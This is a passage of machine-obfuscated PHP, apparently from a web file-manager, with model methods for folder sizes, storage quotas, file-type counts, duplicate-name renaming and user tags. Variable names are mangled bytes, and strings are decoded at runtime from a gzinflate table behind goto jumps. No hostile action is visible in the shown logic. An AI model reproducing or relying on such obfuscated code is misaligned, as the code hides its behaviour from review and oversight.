!$š¨ú¿¤ ? array() : explode($³ñƒÄşà[8], trim($š¨ú¿¤, $³ñƒÄşà[8])); $ùõ¨Öàâ = $Ê·²•Ò; foreach ($î‚¡ÍºÑ as $§®Ëú·ô) { $¿ğôò´© = array($³ñƒÄşà[182] => $ùõ¨Öàâ, $³ñƒÄşà[32] => $§®Ëú·ô); $˜ÇÇğèÔ = $this->field($³ñƒÄşà[2209])->where($¿ğôò´©)->select(); if (!$˜ÇÇğèÔ) { return !1; } $˜ÇÇğèÔ = array_sort_by($˜ÇÇğèÔ, $³ñƒÄşà[475]); $ùõ¨Öàâ = $˜ÇÇğèÔ[0][$³ñƒÄşà[183]]; } $È™Š”¹Œ = $this->sourceInfo($ùõ¨Öàâ); $this->pathInfoFilter($È™Š”¹Œ); return $È™Š”¹Œ; } protected function updateModifyTime($É¿İà‰) { $½Ä‚Ëœ =& $_SERVER[Î‹ÃÂŞ„]; $«ÖœàĞ = defined($½Ä‚Ëœ[2124]) ? USER_ID : 0; if (!$É¿İà‰) { return; } if (!is_array($É¿İà‰)) { $É¿İà‰ = array($É¿İà‰); } foreach ($É¿İà‰ as $ıÖûñ¦× => $‡ÍÈ«Åµ) { $É¿İà‰[$ıÖûñ¦×] = intval($‡ÍÈ«Åµ); $this->sourceCacheClear($‡ÍÈ«Åµ); } $„Ë´Ó±ç = array($½Ä‚Ëœ[183] => array($½Ä‚Ëœ[7], $É¿İà‰)); $“É‘¡±¢ = array($½Ä‚Ëœ[622] => $«ÖœàĞ, $½Ä‚Ëœ[468] => time()); $this->where($„Ë´Ó±ç)->save($“É‘¡±¢); } public function folderSizeReset($Ì¦‡Ë°, $‡ÉäĞ½ = false) { $ö¯ˆ¯Íê =& $_SERVER[Î‹ÃÂŞ„]; if ($this->statusIgnoreResetSpace) { return; } $ù¦ëÁÑ¿ = $this->sourceInfo($Ì¦‡Ë°); $è²ò˜å = $ö¯ˆ¯Íê[2210] . $Ì¦‡Ë°; CacheLock::lock($è²ò˜å, 20); if ($‡ÉäĞ½ === !1) { $this->sourceCacheClear($Ì¦‡Ë°); $ù¦ëÁÑ¿ = $this->sourceInfo($Ì¦‡Ë°); $ûı©åİş = array($ö¯ˆ¯Íê[447] => $Ì¦‡Ë°, $ö¯ˆ¯Íê[474] => 0); $ÄŸâóÂØ = $this->where($ûı©åİş)->sum($ö¯ˆ¯Íê[78]); $‡ÉäĞ½ = intval($ÄŸâóÂØ) - intval($ù¦ëÁÑ¿[$ö¯ˆ¯Íê[78]]); } if ($‡ÉäĞ½ == 0) { return CacheLock::unlock($è²ò˜å); } $ëìÈ¿êœ = $this->parentLevelArray($ù¦ëÁÑ¿[$ö¯ˆ¯Íê[556]]); if (!$ëìÈ¿êœ) { $ëìÈ¿êœ = array(); } $ëìÈ¿êœ[] = $ù¦ëÁÑ¿[$ö¯ˆ¯Íê[183]]; $ûı©åİş = array($ö¯ˆ¯Íê[183] => array($ö¯ˆ¯Íê[462], $ëìÈ¿êœ)); if ($‡ÉäĞ½ < 0) { $ûı©åİş[$ö¯ˆ¯Íê[78]] = array($ö¯ˆ¯Íê[1070], abs($‡ÉäĞ½)); } $this->where($ûı©åİş)->setAdd($ö¯ˆ¯Íê[78], $‡ÉäĞ½); CacheLock::unlock($è²ò˜å); $Å¬®Ç» = $ö¯ˆ¯Íê[2211] . $ù¦ëÁÑ¿[$ö¯ˆ¯Íê[180]] . $ö¯ˆ¯Íê[4] . $ù¦ëÁÑ¿[$ö¯ˆ¯Íê[541]]; $»÷€˜ò = array($ù¦ëÁÑ¿[$ö¯ˆ¯Íê[180]], $ù¦ëÁÑ¿[$ö¯ˆ¯Íê[541]]); TaskRun::timeLimitCall($Å¬®Ç», $ö¯ˆ¯Íê[2212], $»÷€˜ò, 1.5); } public function folderSizeResetChildren($ì™Ú÷“â) { $âØª´ =& $_SERVER[Î‹ÃÂŞ„]; $this->sourceCacheClear($ì™Ú÷“â); $ÄúÀ›Ã = $this->sourceInfo($ì™Ú÷“â); $´’í‰ïˆ = array($âØª´[617] => 1, $âØª´[620] => $ÄúÀ›Ã[$âØª´[541]], $âØª´[623] => array($âØª´[583], $ÄúÀ›Ã[$âØª´[556]] . $ì™Ú÷“â . $âØª´[584])); $ŞôÊŸæû = $âØª´[2213]; $÷¬¶Û¥— = $this->field($ŞôÊŸæû)->where($´’í‰ïˆ)->select(); $´’í‰ïˆ[$âØª´[455]] = 0; $ÜÂ™ôŸò = $this->field($ŞôÊŸæû)->where($´’í‰ïˆ)->select(); if (!$ÜÂ™ôŸò) { return; } $÷¬¶Û¥—[] = $ÄúÀ›Ã; $÷¬¶Û¥— = array_to_keyvalue($÷¬¶Û¥—, $âØª´[183]); foreach ($÷¬¶Û¥— as $ü©éñûš => $Èâ³¤ƒæ) { $÷¬¶Û¥—[$ü©éñûš][$âØª´[2214]] = $÷¬¶Û¥—[$ü©éñûš][$âØª´[78]]; $÷¬¶Û¥—[$ü©éñûš][$âØª´[78]] = 0; } foreach ($ÜÂ™ôŸò as $Èâ³¤ƒæ) { $™êó“Ñ = $Èâ³¤ƒæ[$âØª´[182]] . $âØª´[12]; if (!isset($÷¬¶Û¥—[$™êó“Ñ])) { continue; } if ($Èâ³¤ƒæ[$âØª´[475]] == $÷¬¶Û¥—[$™êó“Ñ][$âØª´[475]]) { $÷¬¶Û¥—[$™êó“Ñ][$âØª´[78]] += $Èâ³¤ƒæ[$âØª´[78]]; } } foreach ($÷¬¶Û¥— as $Èâ³¤ƒæ) { $ßÀ—…¾¼ = $this->parentLevelArray($Èâ³¤ƒæ[$âØª´[556]]); foreach ($ßÀ—…¾¼ as $™êó“Ñ) { $™êó“Ñ = $™êó“Ñ . $âØª´[12]; if (!isset($÷¬¶Û¥—[$™êó“Ñ])) { continue; } if ($Èâ³¤ƒæ[$âØª´[475]] == $÷¬¶Û¥—[$™êó“Ñ][$âØª´[475]]) { $÷¬¶Û¥—[$™êó“Ñ][$âØª´[78]] += $Èâ³¤ƒæ[$âØª´[78]]; } } } $Š™À«Š‰ = array(); foreach ($÷¬¶Û¥— as $Èâ³¤ƒæ) { if ($Èâ³¤ƒæ[$âØª´[78]] == $Èâ³¤ƒæ[$âØª´[2214]]) { continue; } $Š™À«Š‰[] = array($âØª´[183], $Èâ³¤ƒæ[$âØª´[183]], $âØª´[78], $Èâ³¤ƒæ[$âØª´[78]]); } $this->saveAll($Š™À«Š‰); } public function userSpaceReset($ìáş¸´„ = false) { $Äé­¤¤Ü =& $_SERVER[Î‹ÃÂŞ„]; $«›‚íÔ = $this->where(array($Äé­¤¤Ü[180] => self::TYPE_USER, $Äé­¤¤Ü[541] => $ìáş¸´„, $Äé­¤¤Ü[455] => 0))->sum($Äé­¤¤Ü[78]); $«›‚íÔ = !$«›‚íÔ || $«›‚íÔ <= 0 ? 0 : $«›‚íÔ; Model($Äé­¤¤Ü[549])->userEdit($ìáş¸´„, array($Äé­¤¤Ü[1891] => $«›‚íÔ)); } public function targetSpaceUpdate($ÏÉÆ¼ù, $Üûã½×¦) { $¤÷ÅÅ« =& $_SERVER[Î‹ÃÂŞ„]; if (!$Üûã½×¦) { return; } if (!in_array($ÏÉÆ¼ù, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ŠÊºÔìà = $this->targetSpaceSize($ÏÉÆ¼ù, $Üûã½×¦); if ($ÏÉÆ¼ù == self::TYPE_USER) { Model($¤÷ÅÅ«[549])->userEdit($Üûã½×¦, array($¤÷ÅÅ«[1891] => $ŠÊºÔìà)); } else { if ($ÏÉÆ¼ù == self::TYPE_GROUP) { Model($¤÷ÅÅ«[557])->groupEdit($Üûã½×¦, array($¤÷ÅÅ«[1891] => $ŠÊºÔìà)); } } } public function targetSpaceSize($ıóÅŠõÔ, $íïÙúœ) { $ÙË«÷Õæ =& $_SERVER[Î‹ÃÂŞ„]; $‘Ãğç˜Ê = 0; $İ³”Û‚Í = $this->targetSourceRoot($ıóÅŠõÔ, $íïÙúœ, !0); foreach ($İ³”Û‚Í as $›±âÇüë) { if (!$›±âÇüë) { continue; } $‘Ãğç˜Ê += floatval($›±âÇüë[$ÙË«÷Õæ[78]]); $ÃìëºÄ¬ = array($ÙË«÷Õæ[623] => array($ÙË«÷Õæ[583], $ÙË«÷Õæ[566] . $›±âÇüë[$ÙË«÷Õæ[183]] . $ÙË«÷Õæ[584])); $üÆîËÕ’ = Model($ÙË«÷Õæ[473])->field($ÙË«÷Õæ[461])->where($ÃìëºÄ¬)->select(); $üÆîËÕ’ = array_to_keyvalue($üÆîËÕ’, $ÙË«÷Õæ[12], $ÙË«÷Õæ[183]); $üÆîËÕ’ = array_unique(array_filter($üÆîËÕ’)); if ($üÆîËÕ’) { $ÃìëºÄ¬ = array($ÙË«÷Õæ[461] => array($ÙË«÷Õæ[462], $üÆîËÕ’)); $‘Ãğç˜Ê += floatval($this->where($ÃìëºÄ¬)->sum($ÙË«÷Õæ[78])); } } $‘Ãğç˜Ê = !$‘Ãğç˜Ê || $‘Ãğç˜Ê <= 0 ? 0 : $‘Ãğç˜Ê; return $‘Ãğç˜Ê; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¼ªıœ¬ª) { return $this->fileTypeProfile($¼ªıœ¬ª, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ñç­ï¡€) { return $this->fileTypeProfile($ñç­ï¡€, SourceModel::TYPE_GROUP); } private function fileTypeProfile($­‘µâÕá, $¿†ä­”Ë) { $¦ı×‰éŠ =& $_SERVER[Î‹ÃÂŞ„]; $ö­®–İ  = $¦ı×‰éŠ[2215] . $­‘µâÕá . $¦ı×‰éŠ[11] . $¿†ä­”Ë; $„èÇê´ = Cache::get($ö­®–İ ); if ($„èÇê´) { return $„èÇê´; } $ç±òóêÏ = array($¦ı×‰éŠ[617] => 0); if ($­‘µâÕá != !1) { $ç±òóêÏ[$¦ı×‰éŠ[541]] = $­‘µâÕá; $ç±òóêÏ[$¦ı×‰éŠ[180]] = $¿†ä­”Ë; } $ñÏ¦ç¶ğ = array(); $ñÏ¦ç¶ğ[$¦ı×‰éŠ[2216]] = array($¦ı×‰éŠ[2217] => LNG($¦ı×‰éŠ[2216]), $¦ı×‰éŠ[2218] => $this->where($ç±òóêÏ)->count(), $¦ı×‰éŠ[588] => $this->where($ç±òóêÏ)->sum($¦ı×‰éŠ[78])); $æş©ğ—ˆ = KodIO::fileTypeList(); foreach ($æş©ğ—ˆ as $²‹½˜¼« => $ñ˜‚ĞŒ) { $ç±òóêÏ[$¦ı×‰éŠ[456]] = $this->fileTypeWhere($²‹½˜¼«); $ñÏ¦ç¶ğ[$²‹½˜¼«] = array($¦ı×‰éŠ[2217] => $ñ˜‚ĞŒ[$¦ı×‰éŠ[32]], $¦ı×‰éŠ[2218] => $this->where($ç±òóêÏ)->count(), $¦ı×‰éŠ[588] => $this->where($ç±òóêÏ)->sum($¦ı×‰éŠ[78])); } Cache::set($ö­®–İ , $ñÏ¦ç¶ğ, 1200); return $ñÏ¦ç¶ğ; } public function fileNameExist($Í…íÃ˜ö, $–¾¢à­Ñ) { $ñåùèà¯ =& $_SERVER[Î‹ÃÂŞ„]; $üØø“şª = $this->field($ñåùèà¯[2219])->where(array($ñåùèà¯[182] => $Í…íÃ˜ö, $ñåùèà¯[32] => $–¾¢à­Ñ, $ñåùèà¯[475] => 0))->find(); return is_array($üØø“şª) ? $üØø“şª[$ñåùèà¯[183]] : !1; } public function childList($ùé«Ñ…) { $§ÕÜŸ‚í =& $_SERVER[Î‹ÃÂŞ„]; $åÅ„¬µé = $§ÕÜŸ‚í[2191] . $ùé«Ñ…; if (isset(self::$cacheChildList[$åÅ„¬µé])) { return self::$cacheChildList[$åÅ„¬µé]; } $÷‚ÎãÒâ = array($§ÕÜŸ‚í[182] => intval($ùé«Ñ…), $§ÕÜŸ‚í[475] => 0); $Íˆ±ó·ô = $this->where($÷‚ÎãÒâ)->select(); $Íˆ±ó·ô = $Íˆ±ó·ô ? $Íˆ±ó·ô : array(); self::$cacheChildList[$åÅ„¬µé] = $Íˆ±ó·ô; foreach ($Íˆ±ó·ô as $’Äˆ½í) { $åÅ„¬µé = $§ÕÜŸ‚í[503] . $’Äˆ½í[$§ÕÜŸ‚í[183]]; self::$cacheSourceInfo[$åÅ„¬µé] = $’Äˆ½í; } return $Íˆ±ó·ô; } public function fileNameAuto($Ü ºûœ¥, $„ô÷‡©Ì, $¯€˜µÊÜ = REPEAT_RENAME, $ïÑê±à¹ = false) { $¤·²‰îí =& $_SERVER[Î‹ÃÂŞ„]; $×Â½ª…ô = get_path_ext($„ô÷‡©Ì); $òÙ£¹¦ = $×Â½ª…ô ? basename($„ô÷‡©Ì, $¤·²‰îí[10] . $×Â½ª…ô) . $¤·²‰îí[2220] . $×Â½ª…ô : $„ô÷‡©Ì . $¤·²‰îí[430]; $ˆÒÌ¿üÒ = array($¤·²‰îí[182] => $Ü ºûœ¥, $¤·²‰îí[475] => 0, $¤·²‰îí[32] => array($¤·²‰îí[429], $òÙ£¹¦)); $‡Í°…ö = $this->field($¤·²‰îí[32])->where($ˆÒÌ¿üÒ)->select(); $øÁíŸ² = array_to_keyvalue($‡Í°…ö, $¤·²‰îí[12], $¤·²‰îí[32]); return $this->fileNameAutoGet($øÁíŸ², $„ô÷‡©Ì, $¯€˜µÊÜ, $ïÑê±à¹); } public function fileNameAutoGet($ÍşÛ€’Ê, $ˆïÙíñ–, $‰¿¥Ò, $º¹şÈæµ) { $ïËÁú• =& $_SERVER[Î‹ÃÂŞ„]; if ($‰¿¥Ò == REPEAT_REPLACE || !$ÍşÛ€’Ê || !in_array_not_case($ˆïÙíñ–, $ÍşÛ€’Ê) || $º¹şÈæµ && $‰¿¥Ò != REPEAT_RENAME_FOLDER) { return $ˆïÙíñ–; } if ($‰¿¥Ò == REPEAT_SKIP) { return !1; } $€ò·î³© = $ïËÁú•[10] . get_path_ext($ˆïÙíñ–); $€ò·î³© = $€ò·î³© == $ïËÁú•[10] || $º¹şÈæµ ? $ïËÁú•[12] : $€ò·î³©; for ($Æ¸ÊœÖı = 1; $Æ¸ÊœÖı <= count($ÍşÛ€’Ê) + 1; $Æ¸ÊœÖı++) { $˜ïÑ”É„ = substr($ˆïÙíñ–, 0, strlen($ˆïÙíñ–) - strlen($€ò·î³©)); $¶å•çú¹ = $˜ïÑ”É„ . "\x28{$Æ¸ÊœÖı}\51{$€ò·î³©}"; if (!in_array_not_case($¶å•çú¹, $ÍşÛ€’Ê)) { return $¶å•çú¹; } } } } goto EÃÕÌ»İ¶; e¶ˆ™¢¾ğÀ: define($_SERVER[Î‹ÃÂŞ„][0], $_SERVER[Î‹ÃÂŞ„][1]); $_SERVER[ÏõĞ¥ÓÃ] = explode($_SERVER[Î‹ÃÂŞ„][2], gzinflate(substr($_SERVER[Î‹ÃÂŞ„][3], 10, -8))); function binCheckEq($Œ˜İõÑâ, $¥¢ĞÎ¦Ü) { return $Œ˜İõÑâ == $¥¢ĞÎ¦Ü; } goto BçÊ±Á’øš; EöœÖ°ÜÛ±: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($²èøÇìÅ) { $ö€•¢×£ =& $_SERVER[Î‹ÃÂŞ„]; return array($ö€•¢×£[2013] => array($ö€•¢×£[2404] . USER_ID, $ö€•¢×£[2014])); } protected function listData() { $‹âğÅ¼… =& $_SERVER[Î‹ÃÂŞ„]; $ ˜¼¤Ø¯ = array($‹âğÅ¼…[1695] => USER_ID, $‹âğÅ¼…[528] => array($‹âğÅ¼…[2017], 0)); $Œõ®åÛ€ = $‹âğÅ¼…[2405]; $éÆîĞÈó = $this->field($Œõ®åÛ€)->where($ ˜¼¤Ø¯)->order($‹âğÅ¼…[2020])->select(); return $éÆîĞÈó ? $éÆîĞÈó : array(); } protected function addToTag($ƒ×Æ”, $Ë›¿ÚƒĞ) { $â³ÅÀ¶ú =& $_SERVER[Î‹ÃÂŞ„]; if (!Model($â³ÅÀ¶ú[2163])->listData($Ë›¿ÚƒĞ)) { return !1; } if (is_numeric($ƒ×Æ”)) { $¥Åä–Î¾ = Model($â³ÅÀ¶ú[872])->pathInfo($ƒ×Æ”); if (!$¥Åä–Î¾) { return !1; } } else { $¥Åä–Î¾ = IO::infoSimple($ƒ×Æ”); if (!$¥Åä–Î¾) { return !1; } $•«ıŠ„å = $¥Åä–Î¾[$â³ÅÀ¶ú[32]]; $‡¥°À´ = $¥Åä–Î¾[$â³ÅÀ¶ú[33]]; if (isset($¥Åä–Î¾[$â³ÅÀ¶ú[455]])) { $‡¥°À´ = $¥Åä–Î¾[$â³ÅÀ¶ú[455]] == $â³ÅÀ¶ú[90] ? $â³ÅÀ¶ú[77] : $â³ÅÀ¶ú[216]; } } $¢õ¤ä¯¬ = array($â³ÅÀ¶ú[1695] => USER_ID, $â³ÅÀ¶ú[528] => $Ë›¿ÚƒĞ, $â³ÅÀ¶ú[465] => $ƒ×Æ”, $â³ÅÀ¶ú[466] => $‡¥°À´ ? $‡¥°À´ : $â³ÅÀ¶ú[460], $â³ÅÀ¶ú[464] => $•«ıŠ„å ? $•«ıŠ„å : $â³ÅÀ¶ú[12], $â³ÅÀ¶ú[1906] => 0); if ($this->where($¢õ¤ä¯¬)->find()) { return !1; } return $this->add($¢õ¤ä¯¬); } protected function removeFromTag($êˆ·¯ïÌ, $ëÕçˆÂ¤) { $‰‹Ö»—Î =& $_SERVER[Î‹ÃÂŞ„]; if (!Model($‰‹Ö»—Î[2163])->listData($ëÕçˆÂ¤)) { return !1; } if (is_array($êˆ·¯ïÌ)) { $êˆ·¯ïÌ = array($‰‹Ö»—Î[7], $êˆ·¯ïÌ); } $Ÿ—¾—éÙ = array($‰‹Ö»—Î[1695] => USER_ID, $‰‹Ö»—Î[528] => $ëÕçˆÂ¤, $‰‹Ö»—Î[465] => $êˆ·¯ïÌ); return $this->where($Ÿ—¾—éÙ)->delete(); } protected function removeByTag($»•õÆÈš) { $ùî…Í£ =& $_SERVER[Î‹ÃÂŞ„]; if (!$»•õÆÈš) { return !1; } $È·²î¸¿ = array($ùî…Í£[1695] => USER_ID, $ùî…Í£[528] => $»•õÆÈš); return $this->where($È·²î¸¿)->delete(); } protected function removeBySource($ÆâòäŸœ) { $ìäåÍ³ =& $_SERVER[Î‹ÃÂŞ„]; if (is_array($ÆâòäŸœ)) { $ÆâòäŸœ = array($ìäåÍ³[7], $ÆâòäŸœ); } $½ç•´¾ = array($ìäåÍ³[1695] => USER_ID, $ìäåÍ³[528] => array($ìäåÍ³[1069], 0), $ìäåÍ³[465] => $ÆâòäŸœ); return $this->where($½ç•´¾)->delete(); } }